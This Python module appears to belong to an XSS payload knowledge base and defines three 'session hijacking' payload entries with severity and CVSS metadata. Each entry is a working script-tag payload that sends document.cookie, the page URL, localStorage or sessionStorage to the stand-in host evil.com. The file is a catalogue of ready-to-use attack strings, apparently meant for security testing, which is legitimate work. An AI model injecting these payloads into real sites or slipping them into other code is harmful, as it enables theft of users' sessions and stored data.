#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Session Hijacking Payloads
"""

from ..models import PayloadEntry


SESSION_HIJACK_PAYLOADS = {
    "session_1": PayloadEntry(
        payload="<script>fetch('//evil.com/hijack',{method:'POST',body:JSON.stringify({cookie:document.cookie,url:location.href})})</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.5,
        description="Session hijack with context",
        tags=["session", "hijack", "context"],
        reliability="high",
    ),
    "session_2": PayloadEntry(
        payload="<script>fetch('//evil.com/hijack',{method:'POST',body:JSON.stringify({storage:localStorage,session:sessionStorage})})</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.5,
        description="Storage hijack",
        tags=["session", "hijack", "storage"],
        reliability="high",
    ),
    "session_3": PayloadEntry(
        payload="<script>fetch('//evil.com/hijack',{method:'POST',credentials:'include',body:JSON.stringify({cookie:document.cookie})})</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.5,
        description="Session hijack with credentials",
        tags=["session", "hijack", "include"],
        reliability="high",
    ),
}

SESSION_HIJACK_PAYLOADS_TOTAL = len(SESSION_HIJACK_PAYLOADS)
